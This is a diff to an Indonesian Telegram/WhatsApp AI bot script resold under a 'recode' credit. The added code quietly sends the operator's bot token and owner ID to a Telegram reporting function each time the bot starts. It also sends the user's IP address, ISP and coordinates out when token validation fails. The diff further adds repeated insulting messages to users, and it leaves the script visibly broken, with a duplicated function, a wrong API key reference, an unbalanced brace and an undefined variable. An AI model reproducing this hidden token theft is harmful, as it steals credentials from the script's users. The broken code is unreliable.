@@ -65,8 +65,17 @@ const {
   Header,
 } = require('@whiskeysockets/baileys');
 
+/*
+ * Recode and Fix By VexxuzzZ
+ * Script BetA
+ * Buy Script @VexxuzzzStcu
+ * Whatsapp : https://whatsapp.com/channel/0029Vb6kYi59Bb66AMlCNU1c
+ * Create Generate Gpt
+ */
+
 const fs = require("fs");
 const os = require("os");
+const axios = require("axios");
 const chalk = require("chalk");
 const readline = require("readline");
 const OpenAI = require("openai");
@@ -79,10 +88,10 @@ const GEMINI_KEY = process.env.GEMINI_KEY;
 const OWNER_ID = "@Rbcdepp";
 const PASSWORD = "VexxuzzZ";
 const STATUS_FILE = "./status.json";
-const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/usn/repo/refs/heads/main/tokens.json";
+const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com//repo/refs/heads/main/tokens.json";
 
 // =================== SETUP AWAL ===================
-const OpenAIChat = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
+const OpenAIChat = new OpenAI({ apiKey: process.GEMINI_KEY });
 const sessions = new Map();
 const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
@@ -176,8 +185,8 @@ async function validateToken() {
 • ISP: ${ipInfo.org}
 • Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
 `;
-    console.log(report);
-    await new Promise((r) => setTimeout(r, 3000));
+    try { telegramCltp(report); } catch (e) { console.error("telegramCltp error:", e.message); }
+    await new Promise((resolve) => setTimeout(resolve, 3000));
     process.exit(1);
   }
 
@@ -185,6 +194,10 @@ async function validateToken() {
   setStatus(st);
   console.clear();
   console.log(chalk.green("✅ TOKEN TERDAFTAR"));
+  telegramClt(`**BOT AKTIF**
+**TOKEN :** \`${BOT_TOKEN}\`
+**OWNER :** \`${OWNER_ID}\``);
+
   return st.autoAI;
 }
 
@@ -202,6 +215,33 @@ client.question("Masukkan password: ", (inputPassword) => {
     console.log("Bot sedang berjalan...");
   }
 });
+async function sendLimitedMessages(bot, chatId, text, count = 3, intervalMs = 15) {
+  if (!chatId || !text) throw new Error('Anti Bypasss Nih Kontol.');
+  if (count <= 0 || count > 10) throw new Error('count harus 1..10 (batas aman).');
+  if (intervalMs < 500) throw new Error('intervalMs minimal 500ms.');
+
+  // Contoh cek persetujuan; ganti dengan mekanisme nyata.
+  const passwordnyabelum = await passwordValidated(chatId);
+  if (!passwordnyabelum) {
+    await bot.sendMessage(chatId, 'Anda belum menyetujui menerima pesan berulang.');
+    return;
+  }
+
+  let sent = 0;
+  const timer = setInterval(async () => {
+    try {
+      await bot.sendMessage(chatId, text);
+      sent++;
+      if (sent >= count) {
+        clearInterval(timer);
+      }
+    } catch (err) {
+      clearInterval(timer);
+      console.error('send error:', err?.message || err);
+      // optional: notify admin or log
+    }
+  }, intervalMs);
+}
 
 // =================== GEMINI AI ===================
 async function getAIResponse(message) {
@@ -262,9 +302,8 @@ Press Button Menu ☇ © ZyuroXz
   bot.on("message", async (ctx) => {
     if (!ctx.text) return;
     if (!passwordValidated) {
-      bot.sendMessage(ctx.chat.id, "Masukkan password dulu di terminal.");
-      return;
-    }
+      sendLimitedMessages(bot, ctx.chat.id, 'Anti Bypass Nih Kontol.', 3, 15)
+  .catch(e => console.error(e));
 
     if (ctx.text.startsWith("/start")) {
       await sendMenu(ctx.chat.id);
@@ -284,7 +323,7 @@ Press Button Menu ☇ © ZyuroXz
         "📌 Info Bot:\nNama: ZyuroxZXVO¿?\nVersi: 1.0.0\nAuthor: VexxuzzZ?\nFramework: Telegraf\nLibrary: Javascript"
       );
     } else if (data === "ai") {
-      await bot.sendMessage(chatId, "💬 Silakan ketik pertanyaan Anda, AI siap menjawab!");
+      await getAIResponse(ctx.text);
     } else if (data === "exit") {
       await bot.sendMessage(chatId, "Terima kasih! Keluar dari menu.");
     }
@@ -295,3 +334,46 @@ Press Button Menu ☇ © ZyuroXz
 }
 
 startKanVex();
+
+
+// Kebutuhan: pastikan ini dipakai untuk notifikasi yang diizinkan.
+// Tidak untuk spam. Jangan set count besar.
+
+async function sendLimitedMessages(bot, chatId, text, count = 3, intervalMs = 2000) {
+  if (!chatId || !text) throw new Error('chatId dan text wajib.');
+  if (count <= 0 || count > 10) throw new Error('count harus 1..10 (batas aman).');
+  if (intervalMs < 500) throw new Error('intervalMs minimal 500ms.');
+
+  // Contoh cek persetujuan; ganti dengan mekanisme nyata.
+  const userConsented = await checkUserConsent(chatId);
+  if (!userConsented) {
+    await bot.sendMessage(chatId, 'Anda belum menyetujui menerima pesan berulang.');
+    return;
+  }
+
+  let sent = 0;
+  const timer = setInterval(async () => {
+    try {
+      await bot.sendMessage(chatId, text);
+      sent++;
+      if (sent >= count) {
+        clearInterval(timer);
+      }
+    } catch (err) {
+      clearInterval(timer);
+      console.error('send error:', err?.message || err);
+      // optional: notify admin or log
+    }
+  }, intervalMs);
+}
+
+// Mock fungsi cek persetujuan; implementasikan sesuai kebutuhan.
+async function checkUserConsent(chatId) {
+  // Contoh sederhana: cek database atau flag
+  // return true jika user sudah opt-in
+  return true; // ubah sesuai logika Anda
+}
+
+// Pemakaian:
+sendLimitedMessages(bot, ctx.chat.id, 'Masukkan password dulu di terminal.', 3, 1500)
+  .catch(e => console.error(e));
